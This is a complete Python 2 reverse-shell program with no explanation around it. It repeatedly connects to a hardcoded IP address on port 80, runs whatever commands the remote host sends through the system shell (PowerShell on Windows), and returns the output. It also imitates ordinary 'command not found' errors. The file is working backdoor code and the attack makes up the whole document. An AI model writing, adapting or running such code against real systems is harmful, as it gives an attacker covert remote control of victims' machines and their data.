import os, subprocess, socket

_SERVER = '172.16.197.141'
_PORT = 80
_ROOT = ''
_MODE = ''
_OS = os.name
if _OS == 'nt':
    _MODE = 'powershell'
    _ROOT="C:\\"
elif _OS == 'posix':
    _ROOT="/"

os.chdir(_ROOT)

def send_error(errcmnd):
    if _OS == 'nt':
        s.send("\"" + errcmnd + "\" is not recognized as an internal or external command,\noperable program or batch file.\n" + str(os.getcwd()+ ">"))
    elif _OS == 'posix':
        s.send("No command '" + errcmnd + "' found,")
    
def main():
    try:
        while True:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((_SERVER, _PORT))
            except Exception, ex:
                continue
            s.send(str(os.getcwd()) + ">")
            while True:
                try:
                    data = s.recvfrom(65565)[0]
                    if data.strip():
                        arg_list = map(str.strip, data.strip().split());
                        if arg_list[0].lower() == 'cd' and len(arg_list) > 1:
                            try:
                                os.chdir(' '.join(arg_list[1:]))
                                s.send(os.getcwd()+ ">")
                                continue
                            except OSError, ex:
                                s.send(str(ex.strerror) + "\n" + os.getcwd()+ ">")
                                continue
                        if _MODE:
                            arg_list.insert(0, _MODE)
                        command = ' '.join(arg_list)
                        try:
                            out = subprocess.check_output(arg_list, shell=True)
                            s.send(str(out) + os.getcwd() + ">")
                        except subprocess.CalledProcessError as ex:
                            send_error(arg_list[1])
                            continue
                    else:
                        s.send(os.getcwd()+ ">")
                except socket.error, ex:
                    break
                except Exception, ex:
                    continue
    except Exception, ex:
        sys.exit()

if __name__ == '__main__':
    main()
